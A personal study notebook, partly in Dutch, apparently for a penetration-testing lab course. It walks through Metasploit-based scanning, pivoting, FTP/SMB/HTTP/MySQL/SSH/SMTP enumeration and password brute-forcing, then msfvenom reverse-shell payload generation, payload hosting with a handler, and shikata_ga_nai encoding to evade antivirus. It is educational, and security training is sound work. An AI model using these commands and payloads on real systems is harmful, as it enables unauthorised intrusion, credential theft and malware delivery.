
#### Port scanning & Enumeration with nmap 

- Command: nmap -Pn -sV -O ip
- output scan results into xml file format:  -oX \[name file] windows_server_2012 
- nmap -h to see other commands that can be used for output 

Importing scans into msfconsole  (start msfconsole
- command: service PostgreSQL start 
- check the files - command: db_import /root/ 
- import the file - command: db_import /root/filename
- confirm that it is important - command: hosts 
- print services for hosts that you imported - command: services 
- initiate nmap scan from within msfconsole and save results in database - 
	  - Create new workspace - command: workspace -a nmap_msf 
	  - command: db_nmap -Pn -sV -O ip 
	  - list out the hosts and services 


## Enumeration 


###### Port scanning / pivoting 

Auxiliary modules are used to perform functionality like scanning, discovery and fuzzing. We can use it to perform TCP and UDP port scanning as well as enumerating information from services FTP, SSH, HTTP 
	Auxiliary modules can be used during information gathering phase 
Waarom auxiliary modules gebruiken als je ook met nmap kunt scannen? Auxiliary modules zijn erg handig voor **post exploitation phase:**   wanneer je een target hebt geexploit kom je erachter dat deze target onderdeel is van groot netwerk dan heb je nog meer targets die je kunt exploiten through initial exploited server. De auxiliary modules zijn dan handig om verder het interne/private netwerk te scannen. Dit kan niet met nmap omdat je dan nmap moet importeren op geexploite target host of OS. 

![[Pasted image 20230720154107.png]]


- start the postgresql service so we can interact with metasploit database 
- start msfconsole 
- check the status of the database, command: db_status 
- set up workspace, command: workspace -a Port_scan 
- use the auxiliary tcp portscan 
- from the auxiliary module run  curl to download homepage of web application, command: curl ip 
	- search for exploit modules for xoda webapplication -> xoda_file_upload
		- set up rhosts and set targetui /  
		  (/ because the root of the webserver)
	- exploit will set up a meterpreter session 
	- sysinfo will tell us more about the target system 
	- now we want to do port scan on victim two but first we need to find out the private network ip address (subnet) that this victim system is part of so we can target another victim within the network
		- open up a shell session: span a bash session, command: /bin/bash -i
		  ![[Pasted image 20230721142859.png]]
		- ifconfig 
		- get out of bash: terminate shell 
		- back in meterpreter,  command: run autoroute -s ip
				   "run autoroute -s ip" is used to configure a route to a specific subnet over a Meterpreter session. De "autoroute" module in Metasploit wordt gebruikt om de routetabel van het gecompromitteerde systeem te manipuleren, zodat verkeer dat bestemd is voor een specifiek IP-subnet wordt omgeleid via het gecompromitteerde host. Deze techniek is handig wanneer je verkeer wilt omleiden via het gecompromitteerde systeem om toegang te krijgen tot andere interne netwerken.
		- put the meterpreter session in the background, command: background 
		- search portscan 
		- use the tcp portscan 
		- set rhost to the ip in eth1 (ip of the second system)
			because you already added the route we will run the portscan through the first victim. 
	This is how you get a pivot point 
	UDP module: 
	- back 
	- search udp_sweep 

	---- lab ---   
Commands
- ip addr  -  me: 192.70.225.2 and target: 192.70.225.3 
- sudo service postgresql start  && msfconsole -q
- workspace -a Port_scan_target
- search tcp portscan 
- run aux/scanner/portscan/tcp on target
- use exploit(unix/webapp/xoda_file_upload 
- sets targeturi / 
- sysinfo 
- shell
- /bin/bash -i 
- ifconfig
- exit 
- Add the route to metasploit's routing table, command: run autoroute -s 192.135.243.2 
- background
- search portscan 


### FTP Enumeration

Use: file sharing between server and clients, transferring files to directory or web server. FTP access is via username and password. We can use multiple auxiliary modules to enumerate information as well as brute-force attacks on targets running an FTP server. Improper configurated FTP server can allow anonymous logon.  

Commands enumerating ftp  192.104.50.2

1) FTP portscan and ftp version scan (enumeration)
- service postgresql start 
- start up msfconsole 
- check if target system has ftp server running
	- create workspace, command: workspace -a ftp_enum 
	- search portscan -> use aux/scan/portscan/tcp 
	- when you have to many search results use, command: search type: auxiliary name: ftp 
	- use aux/scanner/ftp/ftp_version (this will give us version of ftp and the ftp banner which is usefull information because we can use it to identify vulnerabilities for that version. e.g. search proftpd)

2) ftp bruteforce 
- search for module: search aux ftp (search for aux/scanner/ftp/ftp_login)
- set the user file and pasword file:
	- User_FILE -> /usr/share/metasploit-framework/data/wordlists/common_users.txt 
	- PASS_FILE ->  /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 
- when you have found a password, you can login within  metasploit session, command:  ftp target ip. When you get a service not available error it means that the bruteforce has overwhelmed the service and that there are processes in places for example ddos protection that can make the service unavailable. You have to wait a few minutes. 
- exit the msfconsole
	- command: ftp target 
	- give username and password 
	- ls 
	- get {file}
	- exit 
	- cat {file}
  
3) anonymous login (access remote and anonymously)
   - search type: aux name:ftp   (we are looking for aux/scanner/ftp/anonymous)
   

### SMB Enumeration 

SMB is network file sharing protocol that is used to facilitate of sharing of files and  devices within a local network (LAN). Port 445 but older version of Windows it ran on top of NetBIOS using port 139. Linux uses SAMBA to allow windows systems to access linux shares and drives. 


1a) smb enumeration - identify SMB version on target 
- start up postgresql so we can interact with metasploit database framework (service postgresql start) and start msfconsole 
- add new workspace -a smb_enum 
- als je zelfde target ip blijft gebruiken bij elke module dan gebruik je de variable setg: setg rhost ip 
- search type:auxiliary name:smb 
- use aux/scanner/smb/smb_version 

1b) enumerate smb users 
- search type:auxiliary name:smb_enumusers

1c) enumerate smb shares 
- search type: auxiliary name:smb_enumshares 

2) bruteforce to identify passwords for most interesting user (e.g. admin)
	- search smb_login 
	- set SMBUser (perform bruteforce for admin user without userlist)
	- set pass_file /usr/share/metasploit-framework/data/wordlist/unix_passwords.txt 
	- exit 
	  
3) try login with credentials 
	- command: smbclient -L\\\\\\\\ip\\\\\ -U admin  
		  - `smbclient`: This is the name of the command-line utility used to access SMB/CIFS (Common Internet File System) shares `-L`: This option is used to list the available shares on the specified server.` - `\\\\\\\\\` before `ip`, where the first two backslashes are escape characters, and the remaining `\\` is treated as a literal backslash.\\\\ After the IP address or hostname, there is a single backslash before the `-U` option. This single backslash is also intended to be treated as a literal backslash, so it is not followed by another backslash for escaping. The `ip` should be replaced with the actual IP address or hostname of the server you want to connect to.
  
	![[Pasted image 20230724151801.png]]
	if you want to access any of these shares you will need smbclient and login directly. Follow the following steps: 
	- ,this command lists out the shares: 
	  smbclient -L \\\\\\\\ip\\\\\ -U admin  
	- now we try to access a specific share:   
	  smbclient -L \\\\\\\\ip\\\\\share -U {usernameyouhavecredentialsfor}  ----> smbclient -L \\\\\\\\ip\\\\*\public* -U *admin*  
	- ls 
	- to download a file using SMB client, we say: **get** {filename} when you exit you should have the file 


### Web Server Enumeration 

Web server is software that is used to serve website data on the web, weh servers use HTTP (port 80) to facilitate communication between clients and the web server. We can use auxiliary modules to enumerate the web server version. Examples of popular web servers are?: Apache, Nginx, Microsoft IIS.

used modules: 
- auxiliary/scanner/http/apache_userdir_enum
- auxiliary/scanner/http/brute_dirs
- auxiliary/scanner/http/dir_scanner
- auxiliary/scanner/http/dir_listing
- auxiliary/scanner/http/http_put
- auxiliary/scanner/http/files_dir
- auxiliary/scanner/http/http_login
- auxiliary/scanner/http/http_header
- auxiliary/scanner/http/http_version
- auxiliary/scanner/http/robots_tx

start postgresql - launch msfconsole - set up workspace - setg rhost 
IF you hare targeting a webserver with SSL than add SSL cert in modules 


1.a) enum http server 
- search for http module: search type: aux name: http 
- use the http_version module to get information about the version http server 
- additional enumeration to http headers 
	- use http_header module  

1b) enumeration to hidden directories that you have not access to by downloading and analyzing the robots.txt. The robots.txt prevents search engines from indexing certain files 
- use aux/scanner/http/robots_txt 
	- you do not need to change the path / because the robobts.txt file is usually stored at the root of the webserver 
	- curl http://ip/pathyoufound  (downloads the html file/pulling the index)
		![[Pasted image 20230725151019.png]] when you see index of .. this tells us that this webserver has directory listing enabled, Directory listing is native to some webservers waaronder Apachi this allows you to store files within a directory and they can be indexed and accessed within that directory. Directory listing is mainly used for download pages
		

	2) Directory Brute force (objective: finding hidden directories that cannot be accessed good way to find out what is hosted on the webserver)
		- use dir_scanner 
			- you can use *curl* to analyze content 
			  
We can also do file bruteforcing which is the opposite to directory bruteforcing because instead of performing a bruteforce to find directories we perform a bruteforce to find files.  
- use aux/scanner/http/files_dir 

2) Bruteforce 
	- Use module: http_login 
		- we need to setup AUTH_URI --> the directory that has the authentication enabled (the security directory) /path/ 
		- only use the default username and password list 
		- if you get no results use following wordlist:
			- user_file  /usr/share/metasploit-framework/data/wordlists/namelists.txt
			  Pass_file /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 
			  verbose: false 
		- use module: apache_userdir_enum to find users if the bruteforce is taking to long and no results 
			- change wordlist: common_users.txt 
			- use the usernames for the bruteforce: 
				- use http_login 
					- options 
					- use default passwordlist or change the password file to different one
					- create your own userfile 
						- echo "username" > user.txt   (file is stored under root directory)
						- set user_file /root/user.txt 

### MySQL Enumeration 

MySQL is relational database management system based on SQL and used to store data. Uses tcp port 3306. 

Prep: start postgresql - launch msfconsole - set up workspace - setg rhost 

1) Identify the version of MySQL 
     - use portscan/tcp
	     - perform port scan to check which port MySQL is on 
 -    - search type: aux name: mysql 
	 - use mysql_version module 
	 - you can search for exploit for the version of mysql if there is no exploit for the version than you can to bruteforce: 

2) Bruteforce for credentials 
	-  use mysql_login (we are after the root user)
		- set username to root  -> set USERNAME root 
		- set pass_file /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 
		- set verbose option to false 

3) perform MySQL enumeration through module MySQLenum 
	- search mysql_enum 
	- use aux/admin/mysql/mysql_enum 
	- set PASSWORD twinkle 
	- set USERNAME root 

4) Use module to execute sql queries (interact with sql database)
	- search mysql_sql 
	- use aux/admin/mysql/mysql_sql 
	- set PASSWORD twinkle, set USERNAME root 
	- set SQL *show databases*;  (this will tell us what database are on there, in sql moet je ; achter elke command zetten)

5) find more info about schema (display databases and its tables )
	-  search mysql_schema 
	- use aux/scanner/mysql/mysql_schemadump 
	- set PASSWORD twinkle 
	- set USERNAME root 
	- run (hosts or services, or loot, or creds)
![[Pasted image 20230823123501.png]]

How to quickly get access to mysql database server: 
- command: mysql -h ip -u root -p 
- command: show databases; 


--- Lab --- 





### SSH enumeration 

-> get the version of ssh and find credentials to get remote access to target 

start up metasploit framework - creatework space - setg rhosts and rhost

1) get more information about ssh version 
	- search type:auxiliary name:ssh 
	- use aux/scanner/ssh/ssh_version 
	  
2) perform bruteforce to get credentials 
	- search ssh_login (and use)
	- options (you can lower the number of bruteforce speed to stay stealthy)
	- set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
	- set PASS_FILE /usr/share/metasploit-framework/data/wordlists/common_passwords.txt 

IF the target has been configured to use PASSWORD AUTHENTICATION then we use --> aux/scanner/ssh/ssh_login 
IF the target has been configured to use PUBLIC KEYS than we use aux/scanner/shh/ssh_login_pubkey 
(om die info te vinden kijk in `/etc/ssh/sshd_config` of in de banner)


3) switch to session 
	- sessions 1
	- span a bash session within the session: /bin/bash -i 
	- ls , whoami

Other usefull modules to find usernames 
- use aux/scanner/shh/ssh_enumusers 
	- set user_file /usr/share/metasploit-framework/data/wordlists/common_users.txt 


### SMTP Enumeration 

SMTP is a communication protocol that is used for transmission of email. 
SMTP uses tcp port 25 but can also run on 465 and 587

add workspace -a SMTP_enum + setg rhosts 

1)  what version of smtp and more info 
	- use aux/scanner/smtp/smtp_version 
	- use aux/scanner/smtp/smtp_enum 
2) Use verify to manually check if user exists. TO connect to smtp server with netcat use: nc -v ip port 
	- `VRFY` is used to verify whether a mailbox in the argument exists on the local host. The server response includes the user’s mailbox and may include the user’s full name. 
	- `EXPN` is used to verify whether a mailing list in the argument exists on the local host. The positive response will specify the membership of the recipients
	- `VRFY` and `EXPN` implement SMTP authentication.  Also, they are useful to perform an internal audit of the server. On the other hand, these commands are considered a security risk. Spammers can use them to harvest valid email addresses from the server. Therefore, messaging systems either install corresponding protections or disable the commands.

--- lab --- 192.145.100.2/24

1. What is the SMTP server name and banner. 
   root@attackdefense:~# 192.145.100.3:25 SMTP 220 openmailbox.xyz ESMTP Postfix: Welcome to our mail server.\x0d\x0a
   
2. Connect to SMTP service using netcat and retrieve the hostname of the server (domain name).
   
   root@attackdefense:~# **nc -v 192.145.100.3 25**
target-1 [192.145.100.3] 25 (smtp) open
220 openmailbox.xyz ESMTP Postfix: Welcome to our mail server. 
   
   
   
   
3. Does user “admin” exist on the server machine? Connect to SMTP service using netcat and check manually.
   
   **vrfy admin**
252 2.0.0 admin

   
   
4. Does user “commander” exist on the server machine? Connect to SMTP service using netcat and check manually.
   
   **vrfy commander**
550 5.1.1 commander: Recipient address rejected: User unknown in local recipient table

   

5. What commands can be used to check the supported commands/capabilities? Connect to SMTP service using telnet and check.
   
   
   220 openmailbox.xyz ESMTP Postfix: Welcome to our mail server.
*EHLO me.com*
250-openmailbox.xyz
250-PIPELINING
250-SIZE 10240000
250-VRFY
250-ETRN
250-STARTTLS
250-ENHANCEDSTATUSCODES
250-8BITMIME
250-DSN
250 SMTPUTF8
   
   
6. How many of the common usernames present in the dictionary /usr/share/commix/src/txt/usernames.txt exist on the server. Use smtp-user-enum tool for this task.

![[Pasted image 20230823164226.png]]

command: smpt-user-enum -U .usr/share/commix/src/txt/username.txt -t ip 

7. How many common usernames present in the dictionary /usr/share/metasploit-framework/data/wordlists/unix_users.txt exist on the server. Use suitable metasploit module for this task.
   
   [*] 192.145.100.3:25      - 192.145.100.3:25 Banner: 220 openmailbox.xyz ESM , daemon, games, gnats, irc, list, lp, mail, man, news, nobody, postmaster, proxy, sync, sys, uucp, www-data
[*] 192.145.100.3:25      - Scanned 1 of 1 hosts (100% complete)
   
   
   
8. Connect to SMTP service using telnet and send a fake mail to root user.
   
   https://mailtrap.io/blog/smtp-commands-and-responses/Essential-SMTP-commands-in-the-order-they-may-be-used 
   
   
9. Send a fake mail to root user using sendemail command.
www.kali.org/tools/sendemail



### Vulnerability Scanner with Metasploit framework 

- information will be handy during exploitation phase 

![[Pasted image 20230824101216.png]]

check what hosts are up 
   - `sudo nmap -sn localnetwork/subnet `
   - check: `ip a s `
Create a workspace 

Identify vulnerability on target system 

Open MSFconsole 
1) identify vulnerable versions
	- `db_nmap -sS -sV -O target `
	- command *hosts* shows that information from above command is stored 
	  
2) find exploit for version of a service 
	- search type:exploit name: *service*
	- search *service* 

	1) how to check if the module will work 
		- copy module and use it 
		- command: `info` (this will display info about the module and what version of the service it will exploit) 
		- `set payload windows/meterpreter/reverse_tcp` (this because we are targeting a windows system, default is linux)

3) searchsploit allows you to search in exploit db (we can limit the results to only show metasploit exploit)
	- searchsploit "Microsoft Windows SMB" 
![[Pasted image 20230824105504.png]] Alles met Metasploit tussen haakjes is een msfconsole module 

-  only show metasploit exploits: searchsploit "Microsoft Windows SMB" | grep -e "Metasploit" 

4) DB Autopwn plugin ![[Pasted image 20230824111947.png]]
	- Download the metasploit plugin![[Pasted image 20230824112043.png]]
	- move the file: `sudo mv db_autopawn.rb usr/share/metasploit-framework/plugins directory` 
	- `load db_autopwn` 
	- command to use the plugin: `db_autopwn `
	- use the plugin to enumerate modules: `db_autopwn -p -t `
	- use the plugin but specify the port: `db_autopwn -p -t -PI 445`


5) analyze command will analyze content of metasploit framework database and provide list of vulnerabilities that can be exploited from services 
	- command: analyze 
	- command: vulns 



### Nessus scanner 
To do 


###  Web App Vulnerability Scanning With WMAP 
+ WMAP can be used to automate web server enumeration and scan web applications for vulnerabilities 
+ available as MSF plugin and can be loaded directly into MSF 
+ WMAP is fully integrated with MSF which allows us to perform web app vulnerability scanning from within the msf 
192.51.202.3

1. **Use `wmap`**: Make sure to first start up postgresql (service postgresql start)
    - `load wmap`: This command loads the `wmap` module if it's not already loaded.
        
    - `wmap_`: The `wmap_` command is not entirely clear from the provided instructions, but it could be used to access various functionalities within the `wmap` module.
        
    - **Open Documentation for `wmap` Site**: `wmap_sites -h` is used to open the documentation for the `wmap_sites` feature, which likely deals with managing target websites.
        
    - **Add a Site**: `wmap_sites -a ip` would be used to add a website or IP address to the list of sites to be scanned.
        
    - **Set Up Target**: `wmap_targets -h` opens the documentation for setting up target websites. `wmap_targets -t http://targetip` is used to specify a target website for scanning.
        
    - **Check Sites and Scans**: `wmap_sites -l` and `wmap_targets -l` are used to list the sites that have been added for scanning and what scans have been conducted.
        
2. **Search for Modules for target**:
    
    - `wmap_run -t`: This command is used to search for modules that can be used to enumerate information from the specified target website. It helps identify available vulnerabilities or information-gathering modules.
      
3. **Run Enabled Modules**:
    
    - `wmap_run -e`: This command executes the enabled modules, likely including the ones discovered in the previous step. These modules will scan the target for vulnerabilities and gather information.
4. **List Vulnerabilities**:
    
    - `wmap_vulns -l`: After running the modules, this command is used to list out all the vulnerabilities that the tool was able to find on the target website.
      
      
5. **Use the `aux/scanner/http/options` Module**:
    
    - The `aux/scanner/http/options` module is likely used to interact with the HTTP options of a web server to see what commands are allowed. This can help identify potential security weaknesses related to HTTP methods.
6. **Use the `aux/scanner/http/http_put` Module**:
    
    - The `aux/scanner/http/http_put` module is used to test various directories on a web server to see whether it allows the uploading of files. The provided instructions suggest trying different directories if the root ("/") does not allow file uploads. After attempting an upload, you can use `curl` to check if the upload was successful by accessing the uploaded file via its URL. curl http://ip:80/path/textfile 


## Client Side Attacks 

### Generating payloads with MSFvenom 

What is difference between client-side attacks and host-based/service-based attacks. 
	Client-side attacks target end-user devices and exploit software or hardware vulnerabilities, aiming to compromise user systems and access sensitive data, often using social engineering tactics; whereas host-based/service-based attacks focus on the host system or network services, seeking to exploit vulnerabilities in underlying software or services to gain unauthorized access, manipulate services, or compromise network resources, demanding measures such as patch management, access controls, and intrusion detection for protection.. 


- A client side attack is an attack vector that involves coercing a client to execute a malicious payload on their system that consequently connects back to te attacker when executed 
- Client side attack an use social engineering and portable executables (PEs)
- Client side attack take advantage of human vulnerabilities as opposed to vulnerabilities in services or software running on the target system 
- Attackers need to be aware of AV detection because malicious payload is stored on the clients device. 

Generate payload with msfvenom -> inject the payload ->  distribute the payload through other channel --> when in the system, wait till they click so that the payload will be executed --> be ready with a handler/listener to receive incoming connection back from target system = access to target system. 

msfvenom
- command line utility that can be used to generate and encode MSF payloads for different operating systems 
- msfvenom is a combination of two utilities: msfpayload and msfencode 
- msfvenom is used to generate a malicious meterpreter payload that can be transferred to a client target system. Once executed it will connect back to our payload handler and provide us with remote access to target system. 

msfvenom kan zowel staged als non-staged payload genereren: 
Een staged payload wordt in meerdere fasen afgeleverd op het doelsysteem, bestaande uit een initiële 'stager' (**Initiële Stager**: Dit is het eerste deel van een staged payload. Het is meestal een kleine, onopvallende stukje code of script dat wordt gebruikt om een voet aan de grond te krijgen op het doelsysteem.) die een secundaire payload (**Secundaire Payload**: Dit is het tweede deel van een staged payload. Het is de eigenlijke kwaadaardige code die de aanvaller wil uitvoeren op het doelsysteem.) downloadt en uitvoert, wat meer controle en flexibiliteit biedt aan de aanvaller, terwijl een non-staged payload als één zelfstandige code wordt afgeleverd voor directe uitvoering, wat eenvoudiger is maar mogelijk gemakkelijker detecteerbaar door beveiligingssoftware vanwege zijn grotere voetafdruk.  Het idee achter staged payloads is om de initiële aanvalsketen te scheiden in twee delen: een initiële stager die moeilijker te detecteren is en een secundaire payload die de feitelijke aanvalsdoelen bereikt.
 ![[Pasted image 20230824154209.png]] in de afbeelding kan je zien welke staged is en welke niet. De \/ is een indicatie dat het staged is en de _ _ geeft aan dat het niet-staged is. 

How to generate payload with msfvenom? 

1) start msfvenom 
	- `msfvenom`
	-  `msfvenom --list payloads` will provide you a list of payloads you can generate with msfvenom 
	meterpreter payload will also allow you to specify the target architecture of the target operating system : Windows x64 or x32 payload. Je kan niet een x64 payload running op een 32 bit system dus het is belangrijk dat je hier goed naar kijkt 

 2) generate payload with msfvenom 
	 - ` msfvenom -a x64 -p windows/x64/meterpreter/reverse_tcp LHOST=kali_vm_ip LPORT=port_to_connect_back_to -f exe > /home/kali/Desktop/Windows_payload/payloadx86.exe`
		 - - `-a x64: This option specifies the architecture for the payload, which is set to "x86" in this case. x86 refers to a common 32-bit Intel processor architecture.
		- `-p windows/x64/meterpreter/reverse_tcp`: This option specifies the type of payload to generate. In this case, it's generating a Meterpreter payload
		- `LHOST=kali_vm_ip`: This is the IP address where the compromised Windows machine will try to connect back to.
		- `LPORT=port_to_connect_back_to`: port number where the compromised Windows machine will attempt to connect back to your Kali Linux machine.
		- `-f exe`: This option specifies the format of the payload. In this case, it's specifying that the payload should be in the form of a Windows executable (.exe) file.
		- `> /home/kali/Desktop/Windows_payload/payloadx64.exe`: This part of the command redirects the output of the payload generation to a file named `payloadx64.exe` located in the specified directory on your Kali Linux machine. This file will contain the generated payload. IMPORTANT TO SPECIFY THE EXETENTION 
		  
	- list output formats available that you can output your payloads into: `msfvenom --list formats`
	  
3) generate linux payload 
	- `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=attackers_ip LPORT=port_to_connect_back_to -f elf > ~/Desktop/Linux_Payloads/payloadx86`
	- navigate to the directory where the payload is stored: 
	- give the binary executable permissions: `cmod =x payloadx86`
	- execute it: `./payloadx86` when you have not set up a receiver or handler nothing will happen because you do not have anything to receive the connection with. 

4) get the payload to the targetsystem 
	 - set up a simple webserver within the folder of the payload to host the payloads file, so you can download them from target system-> `sudo python -m SimpleHTTPServer 80 ` 
	 - set up handler to receive reverse connection back from target system -> open new window with msfconsole ->` use multi/handler `-> change the default payload path to your own payload e.g: `set payload windows/x64/meterpreter/reverse_tcp` -> `set LHOST` and `LPORT`


### Encoding Payloads with Msfvenom 

- Most end user AV solutions utilize signature based detection in order to identify malicious files or executables 
- we can evade older signature based AV solutions by encoding our payloads 
- Encoding is the process of modifying the payload shellcode with the objective of modifying the payload signature. Even when you change one bite the signature will change
Shellcode
- shellcode is a piece of code typically used as a payload for exploitation (code within the payload). 
- it gets its name from the term command shell, whereby shellcode is a piece of code that provides an attacker with a remote command shell on the target system 


1) Encode windows payload  
	- `msfvenom --list encoders`
	- `msfvenom -p /windows/meterpreter/reverse_tcp LHOST=kali_ip LPORT=1234 -e x86/shikata_ga_nai -f exe > ~/Desktop/Windows_Payloads/encodex86.exe `
		- - `-p /windows/meterpreter/reverse_tcp`: This specifies the payload to generate. In this case, it's a Windows Meterpreter reverse TCP payload to generate. 
		- `-e x86/shikata_ga_nai`: This specifies an encoder to use with the payload. In this case, it's the "shikata_ga_nai" encoder, which is used to obfuscate the payload and make it harder to detect by antivirus software.
		- `-f exe`: This specifies the format for the generated payload, which is an executable file in this case.
		- `> ~/Desktop/Windows_Payloads/encodex86.exe`: This part of the command redirects the output of `msfvenom` (the generated payload) to a file named "encodex86.exe" located on the user's desktop within a folder named "Windows_Payloads."
		![[Pasted image 20230824165252.png]] increasing the number of iterations  will increase change of evading anti-virus  - by adding: `-i {number of iterations you want}` --- example: `msfvenom -p /windows/meterpreter/reverse_tcp LHOST=kali_ip LPORT=1234 -i 10 -e x86/shikata_ga_nai -f exe > ~/Desktop/Windows_Payloads/encodex86.exe `
		
		

2) linux payload (here we dont use exe(windows) but elf )
	- `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=kali LPORT=1234 -i 10 -e x86/shikata_ga_nai -f elf > ~/Desktop/Linux_Payload/encodedx86` 


### Injecting Payloads into Windows Portable Executables 

